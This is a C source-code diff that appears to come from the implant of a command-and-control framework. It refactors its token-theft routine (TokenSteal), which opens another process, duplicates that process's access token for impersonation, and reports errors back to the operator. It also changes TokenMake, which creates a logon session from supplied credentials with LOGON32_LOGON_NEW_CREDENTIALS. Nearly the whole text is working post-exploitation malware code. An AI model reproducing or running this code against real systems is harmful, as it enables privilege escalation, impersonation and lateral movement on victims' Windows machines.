@@ -97,41 +97,37 @@ DWORD TokenAdd( HANDLE hToken, LPSTR DomainUser, SHORT Type, DWORD dwProcessID, 
     return TokenIndex;
 }
 
-HANDLE TokenSteal( DWORD dwTargetPID )
+HANDLE TokenSteal( DWORD ProcessID )
 {
-    HANDLE              hProcess            = NULL;
-    OBJECT_ATTRIBUTES   ObjectAttributes    = { 0 };
-    CLIENT_ID           ProcClientId        = { 0 };
-    HANDLE              hToken              = NULL;
-    HANDLE              hTokenDuplicate     = NULL;
-    NTSTATUS            NtStatus            = STATUS_SUCCESS;
+    HANDLE   hProcess  = NULL;
+    HANDLE   hToken    = NULL;
+    HANDLE   hTokenDup = NULL;
+    NTSTATUS NtStatus  = STATUS_SUCCESS;
 
-    ProcClientId.UniqueProcess  = dwTargetPID;
-    ProcClientId.UniqueThread   = 0;
-
-    InitializeObjectAttributes( &ObjectAttributes, NULL, 0, NULL, NULL )
-
-    NtStatus = Instance->Syscall.NtOpenProcess( &hProcess, PROCESS_QUERY_LIMITED_INFORMATION, &ObjectAttributes, &ProcClientId );
-    if ( NT_SUCCESS( NtStatus ) )
+    hProcess = ProcessOpen( ProcessID, PROCESS_QUERY_LIMITED_INFORMATION );
+    if ( hProcess )
     {
         NtStatus = Instance->Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken );
         if ( NT_SUCCESS( NtStatus ) )
         {
-            if ( ! Win32_DuplicateTokenEx( hToken, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &hTokenDuplicate ) )
+            if ( ! Win32_DuplicateTokenEx( hToken, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation | SecurityIdentification, TokenPrimary, &hTokenDup ) )
             {
                 PRINTF( "[!] DuplicateTokenEx() error : % u\n", NtGetLastError()) ;
                 SEND_WIN32_BACK
             }
-            else
-            {
-                PRINTF( "Successful duplicated token: %x\n", hToken )
-            }
+            else PRINTF( "Successful duplicated token: %x\n", hToken )
         }
         else
+        {
+            PRINTF( "NtOpenProcessToken: Failed:[%ld : %ld]", NtStatus, Instance->Win32.RtlNtStatusToDosError( NtStatus ) )
             PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
+        }
     }
     else
-        PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
+    {
+        PRINTF( "ProcessOpen: Failed:[%ld]\n", NtGetLastError() )
+        PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+    }
 
     if ( hToken )
         Instance->Win32.NtClose( hToken );
@@ -139,7 +135,7 @@ HANDLE TokenSteal( DWORD dwTargetPID )
     if ( hProcess )
         Instance->Win32.NtClose( hProcess );
 
-    return hTokenDuplicate;
+    return hTokenDup;
 }
 
 BOOL TokenRemove( DWORD TokenID )
@@ -264,10 +260,9 @@ BOOL TokenRemove( DWORD TokenID )
     } while ( TRUE );
 }
 
-//TODO: Finish this implementation
-HANDLE TokenMake( DWORD Type, LPSTR User, LPSTR Password, LPSTR Domain )
+HANDLE TokenMake( LPSTR User, LPSTR Password, LPSTR Domain )
 {
-    PRINTF( "TokenMake( %d, %s, %s, %s )\n", Type, User, Password, Domain )
+    PRINTF( "TokenMake( %s, %s, %s )\n", User, Password, Domain )
     HANDLE hToken = NULL;
 
     if ( ! Instance->Win32.RevertToSelf() )
@@ -277,7 +272,7 @@ HANDLE TokenMake( DWORD Type, LPSTR User, LPSTR Password, LPSTR Domain )
         // TODO: at this point should I return NULL or just continue ? For now i just continue.
     }
 
-    if ( ! Instance->Win32.LogonUserA( User, Password, Domain, Type, LOGON32_PROVIDER_DEFAULT, &hToken ) )
+    if ( ! Instance->Win32.LogonUserA( User, Password, Domain, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken ) )
     {
         PUTS( "LogonUserA: Failed" )
         SEND_WIN32_BACK
